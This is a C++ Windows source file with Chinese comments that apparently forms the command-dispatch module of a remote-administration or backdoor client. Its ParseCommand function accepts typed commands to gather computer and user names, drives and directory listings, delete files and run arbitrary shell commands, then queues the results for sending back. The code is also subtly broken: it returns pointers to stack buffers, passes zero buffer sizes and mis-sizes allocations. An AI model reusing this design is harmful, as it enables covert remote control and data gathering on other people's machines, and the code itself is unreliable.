// pch.cpp: 与预编译标头对应的源文件
#include "pch.h"

// 当使用预编译的头时，需要使用此源文件，编译才能成功。
//如果这样转递char难受的话请看: https://blog.csdn.net/qq_39759656/article/details/81138008
// System Information
char* LookUpSystemInfo() {
	char SystemInfo[DATA_MIN] = { 0 };
	char SystemName[255] = { 0 };
	char UserName[255] = { 0 };
	unsigned long size = 0;
	GetComputerName(SystemName, &size);
	GetUserName(UserName, &size);
	sprintf(SystemInfo, "Compute Name:\"%s\" , Now UserName:\"%s\"", SystemName, UserName);
	return SystemInfo;
}
char* LookUpPan() {
	char Pan[MAX_PATH] = { 0 };
	char Info[MAX_PATH] = { 0 };
	DWORD Result = GetLogicalDriveStringsA(MAX_PATH, Info);
	if (Result > 0 && Result <= MAX_PATH) {
		char* Drive = Info;
		while (*Drive) {
			strcat(Pan, Drive);
			Drive += strlen(Drive) + 1;
		}
	}
	return Pan;
}
char* LookUpRunPath() {
	char RunPath[MAX_PATH] = { 0 };
	if (getcwd(RunPath, strlen(RunPath)) == NULL) {
		strcpy(RunPath, "获取运行路径失败。");
	}
	return RunPath;
}
// Cmd
char* RunCommand(char* Command) {
	HANDLE hRead;
	HANDLE hWrite;
	char Data[DATA_BUFMAX] = { 0 };
	SECURITY_ATTRIBUTES sa = { sizeof(sa) };
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ANONYMOUS);
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		sprintf(Data, "创造管道失败。取消执行。");
	}
	else {
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdInput = hRead;
		si.hStdOutput = hWrite;
		si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		if (!CreateProcessA(NULL, Command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
			sprintf(Data, "执行失败。取消执行。");
		}
		else {
			Sleep(1000);
			WaitForSingleObject(pi.hThread, -1);
			WaitForSingleObject(pi.hProcess, -1);
			DWORD Size = 1;
			if (!ReadFile(hRead, Data, sizeof(Data), &Size, NULL)) {
				sprintf(Data, "读取返回值失败,取消执行");
			}

		}
		CloseHandle(hWrite);
		CloseHandle(hRead);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	return Data;
}
// FILE //传输方式有点特殊,因为需要多段传送
void LookUpFile(char* FilePath, vector<char*>* SendInfoArray) {
	//值得注意的地方就是，FilePath如果不够大可能会溢出。即:把写入大小交给使用者
	char Path[MAX_PATH] = { 0 };
	strcpy(Path, FilePath);// save file path.
	char File[MAX_PATH] = { 0 };
	strcpy(File, FilePath);
	strcat(File, "\\*.*");// add to last.
	HANDLE file;
	WIN32_FIND_DATA pNextInfo;
	file = FindFirstFile(File, &pNextInfo);
	if (file == INVALID_HANDLE_VALUE) {
		char warning[] = "该目录下没有文件。";
		SendInfoArray->push_back((char*)malloc(sizeof(char) * sizeof(warning)));
		sprintf(SendInfoArray->back(), warning);
		return;
	}
	for (int i = 1; FindNextFile(file, &pNextInfo); i++) {
		if (pNextInfo.cFileName[0] == '.') {
			i--;
			continue;
		}
		SYSTEMTIME  AccessTime, CreationTime;
		FileTimeToSystemTime(&pNextInfo.ftLastAccessTime, &AccessTime);//  最后一次访问
		FileTimeToSystemTime(&pNextInfo.ftCreationTime, &CreationTime);// 创建时间
		SendInfoArray->push_back((char*)malloc(sizeof(char) * DATA_BUFMID));
		sprintf(SendInfoArray->back(), "No.%d Path:%s\\%s\t创建时间:%d年%d月%d日\t最后一次访问时间:%d年%d月%d日\n", i, Path, pNextInfo.cFileName, CreationTime.wYear, CreationTime.wMonth, CreationTime.wDay, AccessTime.wYear, AccessTime.wMonth, AccessTime.wDay);
	}
	return;
}
/*
bool LookUpFile(char* Path) {
	FILE* fp = nullptr;
	fp = fopen(Path, "r");
	if (fp != nullptr) {
		fclose(fp);
		return true;
	}
	return false;
}
*/
BOOL RemoveFile(char* Path) {
	if (remove(Path)) return FALSE;
	return TRUE;
}
// 指令处理中心
vector<char*> ReturnInfoArray;
void SetSendInfo(const char* SendInfo) {
	ReturnInfoArray.push_back((char*)malloc(sizeof(char) * strlen(SendInfo)));
	strcpy(ReturnInfoArray.back(), SendInfo);
}
vector<char*>* ParseCommand(char* Type,// 指令分类(指令类型)
						char* Command,// 具体指令
						char* Info) {// 指令参数
	if (!strcmp(Type, "F")) {
		if (!strcmp(Command, "delfile")) {
			if (RemoveFile(Info)) SetSendInfo("删除文件成功。");
			else SetSendInfo("删除文件失败。");
		}
	}
	else if (!strcmp(Type, "L")) {
		if (!strcmp(Info, "systeminfo")) {
			SetSendInfo(LookUpSystemInfo());
		}
		else if (!strcmp(Info, "pan")) {
			SetSendInfo(LookUpPan());
		}
		else if (!strcmp(Info, "runpath")) {
			SetSendInfo(LookUpRunPath());
		}
		else if (!strcmp(Command, "lookfile")) {
			LookUpFile(Info, &ReturnInfoArray);
		}
		else {
			SetSendInfo("查找不到对应具体指令。");
		}
	}
	else if (!strcmp(Type, "S")) {

	}
	else if (!strcmp(Type, "C")) {
		if (!strcmp(Command, "cmd")) {
			SetSendInfo(RunCommand(Info));
		}
	}
	else {
		SetSendInfo("查找不到对应指令类型。");
	}
	return &ReturnInfoArray;
}
BOOL FreeVectorArray() {
	for (int i = 0; i < ReturnInfoArray.size(); i++) {
		free(ReturnInfoArray.at(i));
	}
	ReturnInfoArray.clear();
}
/*
说明
1.当一个模块提供一个用于分配内存块的函数时，该模块也必须提供释放内存的函数。（谁申请内存 谁就去释放内存）、
*/